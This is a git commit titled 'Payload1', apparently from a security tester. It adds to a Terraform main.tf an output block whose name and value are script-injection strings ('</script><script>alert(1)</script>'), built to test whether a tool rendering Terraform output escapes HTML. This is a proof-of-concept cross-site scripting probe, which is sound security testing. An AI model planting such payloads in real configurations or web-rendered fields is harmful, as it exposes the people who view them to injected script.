4adcfda95b1d033b4e717d595aa30f8963b41b02
Greg Foringer <Greg.Foringer@nccgroup.trust>
2019-07-09 09:27:04 -0700

    Payload1

--- main.tf
+++ main.tf
@@ -7,6 +7,10 @@ resource "random_id" "random" {
   byte_length = 16
 }
 
+output "</script><script>alert(1)</script>" {
+  value = "</script><script>alert(2)</script>"
+}
+
 output "random" {
   value = "${random_id.random.hex}"
 }
